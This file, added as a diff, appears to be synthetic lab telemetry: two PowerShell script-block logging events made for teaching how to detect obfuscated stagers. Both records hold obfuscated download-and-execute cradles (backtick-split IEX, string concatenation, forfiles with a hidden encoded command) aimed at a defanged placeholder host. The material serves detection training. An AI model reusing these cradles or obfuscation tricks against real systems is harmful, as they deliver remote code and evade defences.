@@ -1,0 +1,49 @@
+================================================================================
+SYNTHETIC LAB TELEMETRY — NOT A REAL INCIDENT
+Reproduces: character-masking obfuscation (backtick splitting, case
+            randomization, string concatenation) stacked in a single layer, as
+            observed in STEEP#MAVERICK-style stagers.
+Environment: fictional lab domain contoso-corp.test. All hostnames, usernames,
+and the destination URL below are placeholders. The URL is defanged
+(hxxp[://]), points at a reserved .test domain, and the -Enc payload decodes
+to an inert placeholder string only — not a functional second-stage payload.
+Analysis:    see 02-character-masking-backtick-case-notes.md (raw log only
+             below — safe to display in full during a live demo before
+             revealing it)
+================================================================================
+
+Log Name:       Microsoft-Windows-PowerShell/Operational
+EventID:        4104
+TimeCreated:    2026-08-11T14:03:41.884Z
+Computer:       WKSTN17.contoso-corp.test
+Channel:        Microsoft-Windows-PowerShell/Operational
+Level:          Warning
+UserID:         CONTOSO-CORP\j.alvarez
+ProcessId:      7104
+ScriptBlockId:  1fc7d4d6-a490-4a3e-92c3-900f2d0af021
+Path:
+MessageNumber:  1
+MessageTotal:   1
+ScriptBlockText:
+$ProgressPreference='SilentlyContinue';$c=('p'+'o'+'w'+'e'+'r'+'s'+'h'+'e'+'l'+'l');& ("I`E`X") ((New-Object Net.WebClient).DownloadString('hxxp[://]cdn-sync-relay[.]test/lib/stage3-PLACEHOLDER.ps1'))
+
+--------------------------------------------------------------------------------
+
+Log Name:       Microsoft-Windows-PowerShell/Operational
+EventID:        4104
+TimeCreated:    2026-08-11T14:03:42.010Z
+Computer:       WKSTN17.contoso-corp.test
+Channel:        Microsoft-Windows-PowerShell/Operational
+Level:          Warning
+UserID:         CONTOSO-CORP\j.alvarez
+ProcessId:      7104
+ScriptBlockId:  f090aef5-1d66-4422-a601-c25948801ca2
+Path:
+MessageNumber:  1
+MessageTotal:   1
+ScriptBlockText:
+fOrfIlEs /p C:\Windows\System32\WindowsPowerShell\v1.0 /m "p"o"w"e"r"s"h"e"l"l".exe /c "cM`D /c p`O`w`ers`H`ell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAeAB4AHAAWwA6AC8ALwBdAGMAZABuAC0AcwB5AG4AYwAtAHIAZQBsAGEAeQBbAC4AXQB0AGUAcwB0AC8AbABpAGIALwBzAHQAYQBnAGUAMwAtAFAATABBAEMARQBIAE8ATABEAEUAUgAuAHAAcwAxACcAKQA="
+
+================================================================================
+END OF RAW LOG EXCERPT
+================================================================================
